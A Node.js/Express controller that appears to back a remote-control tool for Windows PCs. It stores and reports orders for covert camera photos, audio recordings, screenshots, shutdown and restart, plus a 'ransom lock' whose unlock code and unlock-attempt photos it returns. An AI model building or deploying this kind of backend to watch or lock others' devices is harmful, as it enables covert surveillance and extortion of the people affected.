const Control = require("../Models/controlModel");
const Lock = require("../Models/lockModel");
const moment = require("moment");
exports.status_update = async (req, res) => {
  const { key } = req.body;
  let status_update = {};

  const user_requests = await Control.findOne({ key })
    .sort("-createdAt")
    .select("-__v");

  if (user_requests) {
    if (user_requests.order == "EYE_ON_THE_SKY") {
      status_update.last = "Camera Photo";
    } else if (user_requests.order == "EAR_ON_THE_SKY") {
      status_update.last = "Audio Record";
    } else if (user_requests.order == "INSTANT_LOCK") {
      status_update.last = "Windows Lock";
    } else if (user_requests.order == "RANSOM_LOCK") {
      status_update.last = "Emergency Locker";
    } else if (user_requests.order == "SHUTDOWN_THE_SKY") {
      status_update.last = "Shutdown Request";
    } else if (user_requests.order == "RESTART_THE_SKY") {
      status_update.last = "Restart Request";
    } else if (user_requests.order == "INSTANT_SCREEN") {
      status_update.last = "Screenshot Request";
    }
    status_update.active = !!user_requests.active;

    status_update.response_duration = moment
      .duration(moment(user_requests.updatedAt).diff(user_requests.createdAt))
      .asSeconds();
    status_update.request_from = moment(user_requests.createdAt).fromNow(true);
    status_update.requested_at = moment(user_requests.createdAt).format(
      "MMMM DD@hh:mm A"
    );
    return res.status(200).json({ status: status_update });
  } else {
    status_update.active = false;
    status_update.last = null;
    status_update.response_duration = 0;
    status_update.request_from = 0;
    status_update.requested_at = 0;
    return res.status(200).json({ status: status_update });
  }
};
exports.get_requests_media = async (req, res) => {
  let find_it;
  let media_ls = [];
  let media_dates = [];
  let requests_media = {};

  const { type, key } = req.query;
  if (type == "camera") {
    find_it = "EYE_ON_THE_SKY";
  } else if (type == "microphone") {
    find_it = "EAR_ON_THE_SKY";
  } else if (type == "nlocker") {
    find_it = "RANSOM_LOCK";
  } else if (type == "screenshot") {
    find_it = "INSTANT_SCREEN";
  }

  const media = await Control.find({
    order: find_it,
    done: true,
    active: false,
    media: { $ne: null },
    key,
  }).sort("-createdAt");

  media.forEach((element) => {
    media_ls.push(element.media);
  });

  media.forEach((e) => {
    media_dates.push(moment(e.updatedAt).format("MMMM DD@hh:mm A"));
  });
  requests_media.media = media_ls;
  requests_media.dates = media_dates;
  return res.status(200).json({ requests_media });
};

exports.get_last_power_request = async (req, res) => {
  let last_power = {};
  const { key } = req.query;
  const search = await Control.findOne({
    $or: [
      { order: "SHUTDOWN_THE_SKY" },
      {
        order: "RESTART_THE_SKY",
      },
    ],
    key,
  }).sort("-createdAt");
  if (search) {
    last_power.order = search.order;
    last_power.date = moment(search.createdAt).format("MMMM DD@hh:mm A");
  } else {
    last_power = null;
  }

  return res.status(200).json({ last_power });
};

exports.get_last_windows_lock = async (req, res) => {
  let last_lock = {};
  const { key } = req.query;
  const search = await Control.findOne({ key, order: "INSTANT_LOCK" }).sort(
    "-createdAt"
  );
  if (search) {
    last_lock.date = moment(search.createdAt).format("MMMM DD@hh:mm A");
  } else {
    last_lock = null;
  }
  return res.status(200).json({ last_lock });
};

exports.check_ransom_locker = async (req, res) => {
  let ransom_state = {};
  const { key } = req.query;
  const search = await Lock.findOne({ key, locked: true }).sort("-createdAt");
  if (search) {
    ransom_state.lock_date = moment(search.createdAt).format("MMMM DD@hh:mm A");
    ransom_state.locked = search.locked;
    ransom_state.unlock_code = search.code;
  } else {
    ransom_state = null;
  }
  return res.status(200).json({ ransom_state });
};
exports.get_ransom_history = async (req, res) => {
  let ransom_unlock_history = {};
  const { key } = req.query;
  const search = await Lock.find({ key, media: { $ne: [] } }).sort(
    "-createdAt"
  );
  if (search) {
    let photo_links = [];
    let photos_dates = [];
    var fileNames = [];
    search.map((e, i) => {
      var filtered = search[i].media.filter(function (el) {
        return el != "";
      });
      filtered.forEach((e) => photo_links.push(e));
    });

    photo_links.forEach((e) => {
      fileNames.push(e.split("/")[4]);
    });
    fileNames.forEach((e) => {
      photos_dates.push(moment.unix(e.split("_")[3]).format("MMMM DD@hh:mm A"));
    });

    ransom_unlock_history.try_dates = photos_dates;
    ransom_unlock_history.photo = photo_links;
    ransom_unlock_history.last_try = moment(search.updatedAt).format(
      "MMMM DD@hh:mm A"
    );
  } else {
    ransom_unlock_history = null;
  }

  return res.status(200).json({ ransom_unlock_history });
};
